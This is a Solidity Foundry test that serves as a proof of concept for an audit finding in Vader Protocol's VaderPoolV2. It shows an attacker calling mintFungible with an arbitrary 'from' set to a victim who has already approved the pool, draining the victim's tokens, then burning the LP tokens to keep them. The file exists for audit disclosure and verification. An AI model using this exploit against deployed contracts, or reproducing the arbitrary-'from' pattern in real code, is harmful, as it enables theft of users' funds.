// SPDX-License-Identifier: MIT
pragma solidity =0.8.9;

// Real audited Vader Protocol source (Code4rena 2021-11, commit on default branch).
// H-14 (#42336): VaderPoolV2.mintFungible() takes an arbitrary `from` and pulls BOTH
// the native and foreign deposits via safeTransferFrom(from, ...). Any account can
// front-run a victim's approval, calling mintFungible with from=victim and to=attacker,
// stealing the victim's native+foreign deposit and receiving the LP tokens. The attacker
// then burns the LP to walk away with the victim's assets.
import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import "../src/vader/contracts/dex-v2/pool/VaderPoolV2.sol";
import "../src/vader/contracts/dex-v2/synths/SynthFactory.sol";
import "../src/vader/contracts/dex-v2/wrapper/LPWrapper.sol";
import "../src/vader/contracts/interfaces/dex-v2/wrapper/ILPWrapper.sol";
import "../src/vader/contracts/interfaces/dex-v2/synth/ISynthFactory.sol";
import "../src/vader/contracts/interfaces/shared/IERC20Extended.sol";

/// @notice Minimal real ERC20 used only as the opaque native / foreign tokens.
/// The audited pool, synth factory, LP wrapper and LP token are the REAL Vader source.
contract TestToken is ERC20 {
    constructor(string memory n, string memory s) ERC20(n, s) {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract PoC_42336 is Test {
    TestToken nativeAsset;
    TestToken foreignAsset;
    VaderPoolV2 pool;
    SynthFactory factory;
    LPWrapper wrapper;

    address victim = address(0xBEEF);
    address attacker = address(0xA11CE);

    function setUp() public {
        nativeAsset = new TestToken("Vader", "VADER");
        foreignAsset = new TestToken("USD Coin", "USDC");

        // Real Vader dex-v2 deployment.
        pool = new VaderPoolV2(false, IERC20(address(nativeAsset)));
        factory = new SynthFactory(address(pool));
        wrapper = new LPWrapper(address(pool));
        pool.initialize(ILPWrapper(address(wrapper)), ISynthFactory(address(factory)), address(this));
        pool.setTokenSupport(IERC20(address(foreignAsset)), true);
        pool.setFungibleTokenSupport(IERC20(address(foreignAsset))); // real LP wrapper token

        // Victim approves the pool intending to add fungible liquidity themselves later.
        nativeAsset.mint(victim, 100 ether);
        foreignAsset.mint(victim, 100 ether);
        vm.startPrank(victim);
        nativeAsset.approve(address(pool), type(uint256).max);
        foreignAsset.approve(address(pool), type(uint256).max);
        vm.stopPrank();
    }

    function test_attacker_steals_victim_liquidity_via_arbitrary_from() public {
        assertEq(nativeAsset.balanceOf(victim), 100 ether);
        assertEq(foreignAsset.balanceOf(victim), 100 ether);

        // Attacker front-runs the victim: from = victim, to = attacker.
        vm.prank(attacker);
        uint256 liquidity =
            pool.mintFungible(IERC20(address(foreignAsset)), 100 ether, 100 ether, victim, attacker);

        // Victim's native + foreign have been pulled into the pool; attacker holds the LP.
        assertGt(liquidity, 0, "no LP minted");
        assertEq(nativeAsset.balanceOf(victim), 0, "victim native not drained");
        assertEq(foreignAsset.balanceOf(victim), 0, "victim foreign not drained");
        IERC20Extended lp = wrapper.tokens(IERC20(address(foreignAsset)));
        assertEq(lp.balanceOf(attacker), liquidity, "attacker did not receive LP");

        // Attacker realizes the theft: burn the LP to withdraw the victim's deposit.
        vm.startPrank(attacker);
        IERC20(address(lp)).approve(address(pool), type(uint256).max);
        (uint256 amtNative, uint256 amtForeign) =
            pool.burnFungible(IERC20(address(foreignAsset)), liquidity, attacker);
        vm.stopPrank();

        // Concrete harm: attacker now holds the victim's entire deposit; victim has nothing.
        assertEq(amtNative, 100 ether, "attacker did not recover native");
        assertEq(amtForeign, 100 ether, "attacker did not recover foreign");
        assertEq(nativeAsset.balanceOf(attacker), 100 ether, "attacker native balance wrong");
        assertEq(foreignAsset.balanceOf(attacker), 100 ether, "attacker foreign balance wrong");
        assertEq(nativeAsset.balanceOf(victim), 0);
        assertEq(foreignAsset.balanceOf(victim), 0);

        emit log_named_uint("victim native stolen (wei)", amtNative);
        emit log_named_uint("victim foreign stolen (wei)", amtForeign);
    }
}
